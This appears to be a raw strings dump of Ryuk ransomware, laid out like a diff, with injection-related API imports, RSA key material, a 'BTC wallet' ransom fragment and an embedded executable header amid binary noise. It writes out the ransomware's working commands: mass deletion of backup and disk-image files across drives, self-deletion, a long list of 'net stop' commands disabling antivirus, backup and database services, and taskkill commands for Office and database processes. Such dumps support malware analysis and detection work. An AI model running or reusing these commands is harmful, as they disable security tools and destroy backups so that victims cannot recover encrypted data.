+del /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk
+del /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk
+del %0
+kernel32.dll
+IsWow64Process
+iqkZsdgHinxGGBvFmNpmoSLAqENMcGqmniHObRwwXfiMWVDJCmYKByrUwyKSMnJFjRwLKYnzrNkFjhWscRP
+dNhQzfRKcUwcXxSGfsvZKXlGTGQqZhmViyKAfpRiituTRpLhjUsjoNvbixhehKRIEarSkKhtDJJOSidgLecKydihTYJLimypuSklidnKLAFlOScBmBdtSVcAurVBhtIqPhCcTbjpwVZfCfqYPWaNfavnAhZeEUjgrCudoPDCYbBtkttWAKYZtbrRdzRdcwfdTSDuOWDmfqfgOUNYTkXmUliTFBPUDBNPgZdUbiLrTxcfzxUKyXNWEbLXwkvgltmHtkyoDrtYWHoCMHMkaAFPjGxEzszhOBeRwjxwzSfEZCNpRKzoNPJtwKMbrjpmjbogyzTbKwupLBnyXgtsUXiPNGORdMNRzeEhAmPSMawcZsuRsQwTqiDSHHoaiWfsdXKmgNclsATJtLCGPaPjfrjVbHDmQHIJhxxHFiyQLpyFzqXaELRxRdNuxPpYBlnaHkuFLBLBUhkosPrQZUuTMkSAFNmqVFlOMPqxqvzsBkahIXEMinIXoSCoiVVLakaXuVDHHRQbibrHuZxPQCkihrpzcSyhPDeecOyJtWmkjhfqMIorhsLfxXRrmNabsbXcQRrrkhBwIfSRTnKXDtjrAKZwJMaeHqnYKpugmqSMMpNimlgjiTForiJZjUQLoaUhmLpXVmYRsgZGOgepClcHFzmRBHZHiDTKUFBtqzcHqbfCfoIrBTZeSufxEleUNBmWJVUqIBNvtZnbGGhjITbigTNODQumzJprnIVVdNoVXdfIDWSgRbDUlrFSlKuaBvBygEWRYNbPdTpXdfKKJyCbdXisGuvXiadHcyEmRsPVwROBAzJlMEKuAqeThmvJuXzUOIdWYaiqkGLlreHCpMSBkXBfyPCUfGGDiDKEhzCFTkMvbSzRfkfLGOVDoSeNBixzQerJDMnRbktbPzcyfkqvyDesWkBnGUnstpAPQYFDhDtQdlzTLWBhQRKzkUoxndTEProrWtmfaGHPMqqqqmGqOChfuKPNBYmrWzajykJokKSUSsAkMpbcSegnTQxecqdUsVxrKozKDlxTcmlHsFhhVBOeAqHgyJdyKMeBPXdBbWgJacbjocHNGTxNSMrZcHDaOvjbyVZKhLZHfVAHqZObDRmfIpocpUrCHeQlztPPnbYgRsMRjwGRyEgbMeGpUoyLEDCBPJXCLJwADhPzbxeSIqVeOYFjDUGWvtRQdqnhGYTJeTEjOysRvEXsMVUTwddXcGwAmRXnHLEjhGvoLxfBnEYKlaRAUxuUmIVcLqtCjtdZypPcKIhVhTqsuVfwabxPBNfvPTjQxSKefuxBKEhwFJiiqoUFIuExvffSgyDHEMfpWuuaTRaCHZImyEKMWgjxKDQylsAubCGYxuBEkZzJwpzyFHjFyZRKVVVtWwHthmMaQlmOOnuWdYZMjZWiUAnQMmrSCwKPlkCBWAhvZFLRgOoydFtenSEwNfFLRSWSGorfQIpOyKimWssPmClfAFJSZPfvNvdqCOJajXnLvJiIQfdFoJdaScTWEhgdGFiwsJBAWFazVvJuCGhpvyyXGHlttuTqRWcdumCYEMXrDugZrcaKpCienVBeOchfJAMmnZEApvJMrOXdEYcLeJItsqRgLHUwUirxBZosKDmCINdAZSAapyCkixewPEIwnEWrWNltgeSyIRLxqCjOffPzFFfnyPQpGcYUZesAXekheobVuZRiQWtsnvpAeJkIZfgIQukdeoqpgohbervUQwyrlaGPkQkzRIfjVcFNYkZStWWNTLTlpbtftsGEpXlpjDcJfsornkmFjwHKKvbCaRDTnhwKGZuDAikYWQIJGfAHkRLgloobctXpceBoFXGjukgLMeOHaeBodRSgpYxPnCcMWtLtgopbqqDBFhxplYpZWRjkNmyvAEnvJianVuXzXyDZYwHnkdbpYvKGbjxKqmyeGZOKBgUYKjpEDLWXdcbMgeSpDBQEdtXKeBKyyTpmyBltIxtXUlcjgFVnbHvjMkfcedTcaLDKkhWcrjMpcBmLCQbHiubEGGXnqVGbdAxiPCXSpQMahiWZeHXTMzBZaIOGhUcVblGvgooMcEtfDDSgFbgwGJuHQySSvfRsNxcSkDUBMOhEtRyoWkoIOAdXdJspMJcHABIxLHFNHpKFyUgGexjpZmHVEgsDaCJlHpUUAsYYjHyqbcgejrniIKzdGzMPKwYMMLdmBuZLqEmEukbkPoXJWlEwIruyFRqkbOnJbGFBILLJwdAmQQhbqKZUrFaBJXjIfkkEqbyagLXEITCprPtprPZNEXIzSVZzTyeenvYcbfsvMXgCpUvvYnckmDorVfhXKfZsgGVaLnocjXHSYOoZSthrokGHYUocxjPSjYQEoLRMRIlSwdOslFtvDbKNoUDtvUQaGqepdkXSmBsblebtloorsPnuARDcEpVKjUsRrVaDZNoqsXOAqDkFGAQMCNlycIWQpRXApKXmiOyHcUfsjwvBuCQYSiEdLxtPPaZsgsdSqwLVjDbZrvmzklIkZqmWUyNfAMqLeZmHmKGjtwTOHlFjVqELPtaBnqkcRoHnHZYBDtILCVPWBuytCYeLxIZaeBplfaAyAnnaGBoKPfEEcVbuiciUMqbBDchLrcByLGQZEjiIlzKEoKgFIePTJBpOSmMFBsfKjhsMpjbawAeGebhFxiiXslHRVYKjCDBmKlxGPkyhiBsOaRaABHYXetdCApluTzQfRtXqAzQLFMdTyKuEgQlMDWbYOEEhaxDtXzBLZPWPhkagdIejowQkJoEhsTHNKrZrwmHXykKeckvAKBWWdwQRDtpkFCJOvILeRQwcYfNUBTfjcgjkVhAUnWeuPqIdXocPwxYsHhjRssrYuIiKRUvweKJALdtjvuoheCEuSzBwxUXxydcCBWaOhdqAdWjPaKofRoSsOScPSJtnuunCeYQoBtEQltEsgesAfmvspKZaQGqFthShYpXpnuyGdChdKKSjKheqPKkLMPLcBnlOgsgdwEePoFzLnnAcOTWrwPEsvGlqIzJYwvNSsHjJoDYFoclMadkAuoSRGjNmHEFvrZWxlfBerCfNGUJigWvbaxTmnvOHUSxFVihLqDSnjOAuhuBYLcIscaYdWLRMoPobvNmwFsbUUUYzPmmWcoRFsLMLuintVwooyJoleYehDeHYZOxvPKCIQOZVFMEuelXNhLDPTgvzBqTzPZepwwEJYmWTNgukBOIihrraEgoTRJDeCQCzzggMghuCVyRqadxYskBPhQBZfmEAMAxGsdBLlePljztnxGmZCWaPTyOFfLypvWzFzZFkqssWWwcZQxjmpQudKSBdfexJeNiIFnHcOJvDeZicnvULLQPsFdRMAUWoGiwlWwhJViRQNAgouNlGSCOYrjFCQpPlTzqnYZMMWiHlJOgNfAgobtLDWAaDLOAhenFsKlAheKBxoiHxDyavxtBsUviAJYRZyJAzpymOEXVCZVpEmbzwgKGxvGMmFEjykUKWINvLBrfPPEXEULKhiOjfnImRbKspPWdUhOvkkUOblNyVWCiEJhtpHEOchPXGyWirtAphgeqQsARcfZdDtiskqEKXvXhWyTubUdwvOlvllQwuNIsxZBMySLIVwFvgMYFcffMqhqdkYtzlnjFuxYNQSbAGdaDuJDztdBhRWlmfVPBkEFdwwdzUNofhiqSoeVKWxLRdZtbBhwJNjLXvwJemFreDiNqEmXVsANMiTJYcWSRqQLBUepllPENPPbNXkfmegkonidmZHwraEJvPeTMFSAlaGaaAGNHZGKcAGvikjOZEniUagyNeXrsSWedYeJbeNeqxhnZRJikEMBHHSRKUeBezYApVGbrEaNjryVekuxhtjvayrjrEcMNsxMxEOscGLvBmeDzUfhuGCdxiPAcnluPmtuLNRUUPUmwGXvWdecPXvweHJgqOmbsBWIsnIHeLrPqiPlqnoanHqhuOTxOrXYAYAbkEcKYJLlEEECMfdtSZlPpzFjHinhCSMifhRqfCFuRGarQzblOuhkSOCzDabozLtkLANskegpIJsbRfGfFFHzNSADbIadnXMkMrQCqxTqiwoYrWemWqicydbeCWGwRvygogzPqcNKARgjPecYAWngZyjPDUuMOjrVkcaveGQZHaMYbvQSsjzAwJbvBdqQrqMgrAHxhLXXOchgjbkeTwPPKuPwXeBSalFteTAkjPVmxVGMovPKPUsVWZSIqnhuMqylWnQuWNDGHJjmsXqalvtBoAWtjnkvKNAFaVQgQLXBxEWAhnApFqIAsRCJzaqgTAiELfkxUeEYKuyFHyXMhFPBqKMraEwiwXZhohrYaKDMjkDYSXzJIFTGUIvaaMQuwIItLugAzdnAIDAcuSqeJVnImNmsAtqAhjumHjkuAUaeeORodDnZzxSwzKEoYsIRVBJhqKhqwUUMPDoZfefBuytqZyKQtCQQoIWZpYxmWcWGvhZbqtTcFuKFjMgPgPrhcMELiHlenpVXjCHpctPpZDeGNoMkrBRlOJNALNARfRDiXaBuOJUywJNhcmWEiQmfRNzqsjNGqecmxTMTgjqspeQpgYujiqdJSKwuEmETIStYguUOKaHTKlAKlYxFfFMszDyraVzozrEcvObTXdigrvlQCJTjCzbDuRJjlkmZTmovkKEvmWQsNXiGnoSlvXopqFYlXSlQqAPSkXAqIIkmhBIyJYzYeikDUNKaBUThCMQzauLelIgYZWMvepLHUXKFEWDTRGPxDhIEhqyfHfjfTqKIUnYJbUvoPtbblMvjTNzEMPiImCjUdxOLFkFwnANMzhuhxPGXyzGzgrhmRlUPfaNqfbbbokeFPQaGIEoUsIGAZRpQIQjlonZMfNiHXjwTlNrTiyBmVejxIyFaNHzRbnXmSrAeIMUiNlrrsWWzYWHbibvqxFCdiFrPNsxIyKChviCndHwpdGTCJnvWUihXnzJyJfJpNnXbGVzjVSnXUQRGusZKLCztVIVrJZFEoylbyMCzwToKoBXdxtqKHflboFhLuqWGwmHRFXBdWgYxzJQtUwVAKscJXBCwjIQlEoxVkDNUrYOoyBMxNtKOOQRCAeCutBeXwjFLWeUYkidGLZMhPbsTgwTVRpQSYbPzSqTnnnrNJYkZUJSgUFQKXkoCKbhhquRzhJFiyDjBusbUsPLaHqCxsqqtvQDPCBvZyuDUrYPXHSLmprfIsOiVwPMogByKzbGJPTuxHiSeEtCWOwqeeHXVOWFgJtpxwRsTOvJRHFpqWMMysEfHzSNNEYxhIztuFtmjRlEuGfKWtqSbyvrKeGCFMXHaeTTgWDYaupreFEhxUOkYWtpEmpkJXSvvCYkeaQFCVRbEDszCkWUosPZCyxNqZfGOzswpVzYTrgMwrKYgpRjdCCplkBaGgWZjJOoowpUKsDzGNZDufQBLEKaTObHIlXeDQhjHrjspAPlzOCYUVbhvhDBrfOalSWBmgOWrBbATuCANLmdmJquCWkVzqFseUYoxwpyPelErCJBoSbPsjsQoDfiyZxLdOaYCPDmAguPfupgaRupGmxGSesDsSxppakTtnsTYnzNcZXskJCdHaTyybZAYwEhYDBhgNRQXuZZNxLdZGnEJkRDcnksiTfcuzcsKEumJzHjhvnMBxTAvBylKiDGvytkfnqKkYSNOwtGSnJQLwADErtRMnWPAtvQMffGlsrYODyslbfqhFDjudHnhpcXTWzagUythePqbonzuxGmFlfYoednhyqOFtQdLEhHcAhBZvwdthWUkQuWbpLoynsGLeAqQDgnVgXTZuPilMskSXNHBdJypAPYEATKDAllFmNdeQPqsJyXEXuFkhzrEkYRszYvvIeTWfTBNmDqgQnBgurrliBbdYhmhDFPDeNRehgiTyaAiKBjUxBhRTODEgeAypuuIrgQSrIyDtEGxMeKoaDvbCiOJTnOQOFykZgNfzhQWjQeSWSncdSGwpYPagJMKbvUPHkmpOFQNOJJGjoOCROYQRwnhqhpvSBEfdFbGQXULSkgZeSFyqjgpBMwbZPtkoZNrkHESSrkXZBQhLWahXNMLlWSGfUqeoZFFtmTkNKBYApndINFqzlhmvqLYmfogYKidzKYTKnpANrPjyITtYXanHDQZkbYMqfRqlMsqcdpopGgBeHMOZBkuHnFYnIfUTeVzDhPypJjneFkYMgHZjhqlQHvFtpzgfLFBRZvgNmWEXjTHxFuHGTvIfRYtLeZehDJejMTEVdwNdWvxuswwzFsmyRkQLIdPlhkkuXGLXdPMEUryhnyoyZWGgczzdnTticNLvfqASlilFmUwwGBXruQUIVVadIczlCPShQtMhJuMVsCQXstZdvahODVVUEoeTYEJaXXLQsZATuhXUziHMzbJwkPnjoucSdUOGjpgVSEPNtbssqKapWGnTxOAmurDTgKqiototBcMstJGWCxsjaweFjzAMbEIQKqrMWrQVUEGKEFkCLlxUrPmECbAVSvIAmgujqejkKtvFxTcuTsKepEWDOApJIjELEyTcNwpEGFifqYkdvqVQreqzehSEVsKMQIekrYexfAItHoKgtXnIvXmqjSjaoVdErSnzZmmbraOzsKzyyBoeMFcibIVeildhNkqtDXXGibKIPZCNERkaausMxuacgBDSiMotLHgMoISrEXgscdVtJxHPVFASPhZgpmElOxcKMZlDbydTOVyeeZdHyuwXcImPeXgO
+ETW0
+InvokeMainViaCRT
+"Main Invoked."
+FileName
+ExitMainViaCRT
+"Main Returned."
+FileName
+Microsoft.CRTProvider
+RSDS
+C:\Users\Admin\Documents\Visual Studio 2015\Projects From Ryuk\ConsoleApplication54\x64\Release\ConsoleApplication54.pdb
+GCTL
+.text
+.text$mn
+.text$mn$00
+.text$x
+.idata$5
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$zETW0
+.rdata$zETW1
+.rdata$zETW2
+.rdata$zETW9
+.rdata$zzzdbg
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.xdata
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.data
+.bss
+.pdata
+.gfids$x
+.gfids$y
+.rsrc$01
+.rsrc$02
+WriteProcessMemory
+HeapFree
+SetLastError
+GetCommandLineW
+GetCurrentProcess
+GetModuleFileNameW
+CreateFileW
+GetVersionExW
+GetModuleHandleA
+OpenProcess
+CreateToolhelp32Snapshot
+Sleep
+GetLastError
+Process32NextW
+GetCurrentThread
+LoadLibraryA
+GlobalAlloc
+DeleteFileW
+Process32FirstW
+GlobalFree
+CloseHandle
+HeapAlloc
+GetWindowsDirectoryW
+GetProcAddress
+VirtualAllocEx
+LocalFree
+GetProcessHeap
+FreeLibrary
+CreateRemoteThread
+VirtualFreeEx
+KERNEL32.dll
+GetTokenInformation
+LookupAccountSidW
+OpenThreadToken
+OpenProcessToken
+ImpersonateSelf
+AdjustTokenPrivileges
+LookupPrivilegeValueW
+ADVAPI32.dll
+ShellExecuteW
+CommandLineToArgvW
+SHELL32.dll
+RtlCaptureContext
+RtlLookupFunctionEntry
+RtlVirtualUnwind
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+TerminateProcess
+IsProcessorFeaturePresent
+QueryPerformanceCounter
+GetCurrentProcessId
+GetCurrentThreadId
+GetSystemTimeAsFileTime
+InitializeSListHead
+IsDebuggerPresent
+GetStartupInfoW
+GetModuleHandleW
+RtlUnwindEx
+RaiseException
+InitializeCriticalSectionAndSpinCount
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+LoadLibraryExW
+EnterCriticalSection
+LeaveCriticalSection
+DeleteCriticalSection
+ExitProcess
+GetModuleHandleExW
+GetStdHandle
+WriteFile
+GetModuleFileNameA
+MultiByteToWideChar
+WideCharToMultiByte
+GetACP
+LCMapStringW
+GetFileType
+FindClose
+FindFirstFileExA
+FindNextFileA
+IsValidCodePage
+GetOEMCP
+GetCPInfo
+GetCommandLineA
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+SetStdHandle
+GetStringTypeW
+FlushFileBuffers
+GetConsoleCP
+GetConsoleMode
+HeapSize
+HeapReAlloc
+SetFilePointerEx
+WriteConsoleW
+SystemFunction036
+qj"*
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+cies\System\
+`\w?<
+%x?f`w
+KuIY/
+stop "Acronis VSS Provider" /y
+stop "Enterprise Client Service" /y
+stop "Sophos Agent" /y
+stop "Sophos AutoUpdate Service" /y
+stop "Sophos Clean Service" /y
+stop "Sophos Device Control Service" /y
+stop "Sophos File Scanner Service" /y
+stop "Sophos Health Service" /y
+stop "Sophos MCS Agent" /y
+stop "Sophos MCS Client" /y
+stop "Sophos Message Router" /y
+stop "Sophos Safestore Service" /y
+stop "Sophos System Protection Service" /y
+stop "Sophos Web Control Service" /y
+stop "SQLsafe Backup Service" /y
+stop "SQLsafe Filter Service" /y
+stop "Symantec System Recovery" /y
+stop "Veeam Backup Catalog Data Service" /y
+stop AcronisAgent /y
+stop AcrSch2Svc /y
+stop Antivirus /y
+stop ARSM /y
+stop BackupExecAgentAccelerator /y
+stop BackupExecAgentBrowser /y
+stop BackupExecDeviceMediaService /y
+stop BackupExecJobEngine /y
+stop BackupExecManagementService /y
+stop BackupExecRPCService /y
+stop BackupExecVSSProvider /y
+stop bedbg /y
+stop DCAgent /y
+stop EPSecurityService /y
+stop EPUpdateService /y
+stop EraserSvc11710 /y
+stop EsgShKernel /y
+stop FA_Scheduler /y
+stop IISAdmin /y
+stop IMAP4Svc /y
+stop macmnsvc /y
+stop masvc /y
+stop MBAMService /y
+stop MBEndpointAgent /y
+stop McAfeeEngineService /y
+stop McAfeeFramework /y
+stop McAfeeFrameworkMcAfeeFramework /y
+stop McShield /y
+stop McTaskManager /y
+stop mfemms /y
+stop mfevtp /y
+stop MMS /y
+stop mozyprobackup /y
+stop MsDtsServer /y
+stop MsDtsServer100 /y
+stop MsDtsServer110 /y
+stop MSExchangeES /y
+stop MSExchangeIS /y
+stop MSExchangeMGMT /y
+stop MSExchangeMTA /y
+stop MSExchangeSA /y
+stop MSExchangeSRS /y
+stop MSOLAP$SQL_2008 /y
+stop MSOLAP$SYSTEM_BGC /y
+stop MSOLAP$TPS /y
+stop MSOLAP$TPSAMA /y
+stop MSSQL$BKUPEXEC /y
+stop MSSQL$ECWDB2 /y
+stop MSSQL$PRACTICEMGT /y
+stop MSSQL$PRACTTICEBGC /y
+stop MSSQL$PROFXENGAGEMENT /y
+stop MSSQL$SBSMONITORING /y
+stop MSSQL$SHAREPOINT /y
+stop MSSQL$SQL_2008 /y
+stop MSSQL$SYSTEM_BGC /y
+stop MSSQL$TPS /y
+stop MSSQL$TPSAMA /y
+stop MSSQL$VEEAMSQL2008R2 /y
+stop MSSQL$VEEAMSQL2012 /y
+stop MSSQLFDLauncher /y
+stop MSSQLFDLauncher$PROFXENGAGEMENT /y
+stop MSSQLFDLauncher$SBSMONITORING /y
+stop MSSQLFDLauncher$SHAREPOINT /y
+stop MSSQLFDLauncher$SQL_2008 /y
+stop MSSQLFDLauncher$SYSTEM_BGC /y
+stop MSSQLFDLauncher$TPS /y
+stop MSSQLFDLauncher$TPSAMA /y
+stop MSSQLSERVER /y
+stop MSSQLServerADHelper100 /y
+stop MSSQLServerOLAPService /y
+stop MySQL80 /y
+stop MySQL57 /y
+stop ntrtscan /y
+stop OracleClientCache80 /y
+stop PDVFSService /y
+stop POP3Svc /y
+stop ReportServer /y
+stop ReportServer$SQL_2008 /y
+stop ReportServer$SYSTEM_BGC /y
+stop ReportServer$TPS /y
+stop ReportServer$TPSAMA /y
+stop RESvc /y
+stop sacsvr /y
+stop SamSs /y
+stop SAVAdminService /y
+stop SAVService /y
+stop SDRSVC /y
+stop SepMasterService /y
+stop ShMonitor /y
+stop Smcinst /y
+stop SmcService /y
+stop SMTPSvc /y
+stop SNAC /y
+stop SntpService /y
+stop sophossps /y
+stop SQLAgent$BKUPEXEC /y
+stop SQLAgent$ECWDB2 /y
+stop SQLAgent$PRACTTICEBGC /y
+stop SQLAgent$PRACTTICEMGT /y
+stop SQLAgent$PROFXENGAGEMENT /y
+stop SQLAgent$SBSMONITORING /y
+stop SQLAgent$SHAREPOINT /y
+stop SQLAgent$SQL_2008 /y
+stop SQLAgent$SYSTEM_BGC /y
+stop SQLAgent$TPS /y
+stop SQLAgent$TPSAMA /y
+stop SQLAgent$VEEAMSQL2008R2 /y
+stop SQLAgent$VEEAMSQL2012 /y
+stop SQLBrowser /y
+stop SQLSafeOLRService /y
+stop SQLSERVERAGENT /y
+stop SQLTELEMETRY /y
+stop SQLTELEMETRY$ECWDB2 /y
+stop SQLWriter /y
+stop SstpSvc /y
+stop svcGenericHost /y
+stop swi_filter /y
+stop swi_service /y
+stop swi_update_64 /y
+stop TmCCSF /y
+stop tmlisten /y
+stop TrueKey /y
+stop TrueKeyScheduler /y
+stop TrueKeyServiceHelper /y
+stop UI0Detect /y
+stop VeeamBackupSvc /y
+stop VeeamBrokerSvc /y
+stop VeeamCatalogSvc /y
+stop VeeamCloudSvc /y
+stop VeeamDeploymentService /y
+stop VeeamDeploySvc /y
+stop VeeamEnterpriseManagerSvc /y
+stop VeeamMountSvc /y
+stop VeeamNFSSvc /y
+stop VeeamRESTSvc /y
+stop VeeamTransportSvc /y
+stop W3Svc /y
+stop wbengine /y
+stop WRSVC /y
+stop MSSQL$VEEAMSQL2008R2 /y
+stop SQLAgent$VEEAMSQL2008R2 /y
+stop VeeamHvIntegrationSvc /y
+stop swi_update /y
+stop SQLAgent$CXDB /y
+stop SQLAgent$CITRIX_METAFRAME /y
+stop "SQL Backups" /y
+stop MSSQL$PROD /y
+stop "Zoolz 2 Service" /y
+stop MSSQLServerADHelper /y 
+stop SQLAgent$PROD /y 
+stop msftesql$PROD /y 
+stop NetMsmqActivator /y
+stop EhttpSrv /y
+stop ekrn /y
+stop ESHASRV /y
+stop MSSQL$SOPHOS /y
+stop SQLAgent$SOPHOS /y
+stop AVP /y
+stop klnagent /y
+stop MSSQL$SQLEXPRESS /y
+stop SQLAgent$SQLEXPRESS /y
+stop wbengine /y
+stop kavfsslp /y
+stop KAVFSGT /y
+stop KAVFS /y
+stop mfefire /y
+"=/8
+%?=$>
+6,'0
+55>_e0??
+1?=/8
+4*;'
+%?=>8
+"&3;
+4$3%
+%?=$>
+%?=*>
+5.3'
+%?=$>
+6,'0
+55>_e&3:
+1?=/8
+%?=/8
+%?=?4
+%?=/8
+%?=/8
+53',)
+%?=*$
+%2(&
+%?=%>
+=&( 
+1?=/8
+%?=:%
+!+4/
+%?==8
+%?=-#
+,,=(
+*;G5
+?',?
+/$;4
+i{G5
+%'4*
+%&?*
+%%?'"4
+%&?:
+%'"9
+%+79
+%&?;
+%#98
+%?=<"
+%?=<"
+0?.&!
+0?.&!
+0?.8$
+(0?0
+/,,)#
+0?.*=
+),"4
+0?.-4
+0?.:4
+6,ZcL>%
+., ?
+=Qhg
+='",
+='",
+Ryuk
+ye0$
+m}|Ue
+XLvw
+QK- 
+%XQRR@
+eS;}
+JJM%
+:[	a.
+F74g
+)/tE
+>tI)
+OB\8m
+V+<z
+[wR@
+3|)z'
+6->R)
+MyiW
+|MJ4
+nFg*
+bIj)V
+3M!B
+v.[jk
+3G6cM
+e'nK
+vkV@V
+-y%9
+lTGg_
+RSA1
+30ca
+){LA
+IA}n
+<:%p
+%BxkIs
+":"%
+2GtALl1>
+%r=-
+6!j'2
+& :8
+?>.(
+;;ML
+Q<>4
+(E!0
+"d!8
+>2 *z
+17jxE
+G,:>01
+t4'=:2'*|G)
+u$Ql
+=<w(
+T<9+
+:=<(
+A%'$
+}kOWI
+?<g6=
+?=@k9
+*s;'	
+D18M
+l*)p
+!'C\BD@,7X
+;X}P?+
+?l )b1	
+Q5> ?S6
+H,6&?
+=U0-$-!
+oc&=h;
+',<7P
+dy]9
+i	5r&
+a$<W>%
+?(>^Cc`f3
+8P!9
+6"<NE
+M'1h;<i
+BTC wallet:
+d4?!A-z
+j)86G2' |
+3*5#
+%BxkIt6
+%BxkIt2
+(=G3
+d4?!A-z
+j)82@)2!}
+D:poY*H
+No system is safe
+/IM zoolz.exe /F
+/IM agntsvc.exe /F
+/IM dbeng50.exe /F
+/IM dbsnmp.exe /F
+/IM encsvc.exe /F
+/IM excel.exe /F
+/IM firefoxconfig.exe /F
+/IM infopath.exe /F
+/IM isqlplussvc.exe /F
+/IM msaccess.exe /F
+/IM msftesql.exe /F
+/IM mspub.exe /F
+/IM mydesktopqos.exe /F
+/IM mydesktopservice.exe /F
+/IM mysqld.exe /F
+/IM mysqld-nt.exe /F
+/IM mysqld-opt.exe /F
+/IM ocautoupds.exe /F
+/IM ocomm.exe /F
+/IM ocssd.exe /F
+/IM onenote.exe /F
+/IM oracle.exe /F
+/IM outlook.exe /F
+/IM powerpnt.exe /F
+/IM sqbcoreservice.exe /F
+/IM sqlagent.exe /F
+/IM sqlbrowser.exe /F
+/IM sqlservr.exe /F
+/IM sqlwriter.exe /F
+/IM steam.exe /F
+/IM synctime.exe /F
+/IM tbirdconfig.exe /F
+/IM thebat.exe /F
+/IM thebat64.exe /F
+/IM thunderbird.exe /F
+/IM visio.exe /F
+/IM winword.exe /F
+/IM wordpad.exe /F
+/IM xfssvccon.exe /F
+/IM tmlisten.exe /F
+/IM PccNTMon.exe /F
+/IM CNTAoSMgr.exe /F
+/IM Ntrtscan.exe /F
+/IM mbamtray.exe /F
+">	=
+/95"
+RSA1
+ZUKUx}"K
+4B	!
+-:I~
+6%I~
+%oP?
+?B(,
+g*SqM5'T2Xzf
+4_nyX
+ ,I"
+?iF7
+kBu&
+`iF<
+ ,I"
+?iF7
+kBu&
+`iF<
+g}Y`/
+=,I~
+5;T5Xzf
+?_>sI~
+>Dc'
+=,I~
+5;T4Xzf
+?_?sI~
+?t]aS
+3'I#
+4B)!
+qM<&
+`iF>
+g,SqM7(
+ ,T$
+?-d[
+3'I#
+4B)!
+qM<&
+`iF>
+g/SqM7(
+ ,TeRk
++\h,:
+4Bu/
+#_<sI~
+kBu$
+\h,:
+4Bu/
+#_=sI~
+kBu$
+lVjx$
+?B(,
+g.SqM5'T6Xzf
+4_/'
+5oP?
+?B(,
+g!SqM5'T9Xzf
+4_nyX
+ ,I"
+?iF7
+kBu&
+`iF<
+?=d[
+?%I~
+qM+i
+k>pg?
+&z*S
+2B9s5{L8(
+%B9s5{L8"
+{Lpi
+k>8(
+*cG{B9s5{L),
+3'I2X
+1Dc5
+6iF"Bu/I~
+B>s5{L8(
+;"I5X
+1/I5X
+2	/9C
+Hz-S
+pgCq
+?=I5X
+k>pg
+"	WC
+qM<iF B?s5{L
+;*I4X
+k>pg
+;=I4X
+cG3	<i
+*cG{B?s53
+!HtcI4X
+k>pg
+:oP-
+=Bu:I~
+k>pg
+0	z/S
+k>pg
+pgCq
+{Lpi
+k>pg
+?B<s5{L>:
+\h>,
+qM)iF7Bu8I6X
+k>pg
+:B=s5{L-+
+7B=s5
+!HtcI6X
+2	/9C
+Hz.S
+%B=s5{L- 
+)"d[
+?%I~
+qM+i
+k>pg?
+&z!S
+2B2s5{L8(
+%B2s5{L8"
+{Lpi
+k>8(
+*cG{B2s5{L),
+3'I9X
+1Dc5
+6iLa
+<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level='asInvoker' uiAccess='false' />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+!This program cannot be run in DOS mode.
+Rich
+.text
+`.rdata
+@.data
+.gfids
+PWh#
+YY^]
+u$WSQ
+^_[]
+SVW3
+0-x3
+QSVW
+t)h(#
+SVWh
+ @A;
+0PhT
+0Pht
+SVW3
+dVWj2
+PQhx3
+uWh`8
+0hHd
+0j j
+0hHd
+0hHd
+0hHd
+0j j
+0hHd
+uBj(j
+0hHd
+0hHd
+	80j
+<M`d
+D$H3
+)D$ 
+)D$0
+DD .
+DD .
+DD .
+)D$p
+t	Bf
+70AF
+0hHd
+0hHd
+70_^
+70AF
+T$(h
+D$4f
+D$0PV
+jdRP
+<SLv8j
+jdQW
+IM"w5
+St#@
+w"Ph@B
+D$H+
+D$Hj
+T$H3
+D$8@B
+L$Df
+D$$@B
+D$DP
+t$,WV
+D$<@B
+t$Lj
+D$(PWj
+t$Lj
+t$LV
+t$,WV
+L$D@
+L$D;
+)D$Pf
+HERMf
+D$,Pj
+D$,P
+T$ h
+T$ h
+T$ h
+T$ h
+T$ 3
+tEff
+f;LU
+f;DM
+t	@f
+f;DM
+Vh J
+0_^[
+\u53
+<Q\t
+ZSVW+
+eu 8U
+lu&8U
+duP8U
+70hL+
+70h0
+70h@
+GetIP
+pNet
+Tablf
+SVW3
+	80V
+0PVf
+SVWjdP
+j Y+
+0j Y+
+8csm
+Y__^[
+ineI
+5ntel
+5Genu
+t#=`
+vZWh
+vZWh
+PPPh 
+8_^]
+xj~W
+8csm
+t+h<
+_^[]
+^_[]
+j2X^]
+j2X^]
+j2X^]
+j2X^]
+Vh S
+0h S
+Vh<S
+0h4S
+0h<S
+VhPS
+0hHS
+0hPS
+0Wj 
+0j	Y
+URPQQh
+L$,3
+UVWS
+[_^]
+SVWj
+_^[]
+j Y+
+SVWUj
+]_^[
+;t$,v-
+UQPXY]Y[
+j Y+
+t#Vh
+j Y+
+~8@_
+F4^[]
+QQSV
+~8@_
+F4^[
+	<et
+<Pt8
+y1*t
+A1<Fu
+<Nu&
+u<dt
+<Xu]
+^$+^8+
+y1*t
+F4T[
+F1<at
+<At	
+F1<gt
+v(PQ
+F1<gt
+N @@
+F8SP
+9F(~
+F4\[
+F4T[
+u&9E
+C;^8u
+_^[]
+j-ZCf
+_^[]
+99t	
+wOtD
+j Y+
+PWWS
+A98u
+>"u1
+< t1<	t-
